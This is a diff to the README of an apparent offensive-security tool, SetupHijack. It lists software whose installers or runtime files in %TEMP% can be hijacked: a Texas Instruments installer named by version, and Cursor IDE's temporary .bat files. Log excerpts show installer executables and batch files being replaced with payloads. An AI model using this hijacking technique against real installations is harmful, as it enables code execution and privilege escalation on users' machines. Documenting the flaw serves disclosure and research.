@@ -190,6 +190,7 @@ Targeting a single directory (such as `%TEMP%`) at a time can increase the likel
 - Visual Studio code-signing checks on updates prevent exploitation, (lightly tested .VSIX)
 
 - Texas Instrument Code Composer Installer can be exploited for auth bypass 09/25/2025.
+  (ccs_setup_20.3.0.00014.exe)
 
 ```
 [2025-09-25 14:39:59] [SetupHijack] Replaced C:\Users\FANTAS~1\AppData\Local\Temp\ccs_fe3a9075-a8c1-44c2-69a2-0d76d423353e\util\7z.exe with payload c:\Users\Fantastic\Desktop\DEMO\Renge_x64.exe, backup: C:\Users\FANTAS~1\AppData\Local\Temp\ccs_fe3a9075-a8c1-44c2-69a2-0d76d423353e\util\7z.exe.bak
@@ -211,6 +212,8 @@ Targeting a single directory (such as `%TEMP%`) at a time can increase the likel
 [2025-09-25 14:40:29] [SetupHijack] Replaced C:\Users\FANTAS~1\AppData\Local\Temp\tmp1758829228.bat with payload install.bat, backup: C:\Users\FANTAS~1\AppData\Local\Temp\tmp1758829228.bat.bak
 [2025-09-25 14:40:29] [SetupHijack] New infections this run: 1
 ```
+
+- Cursor IDE has been observed creating .bat files and command history in %TEMP% that can be exploited. 
 
 ---
 
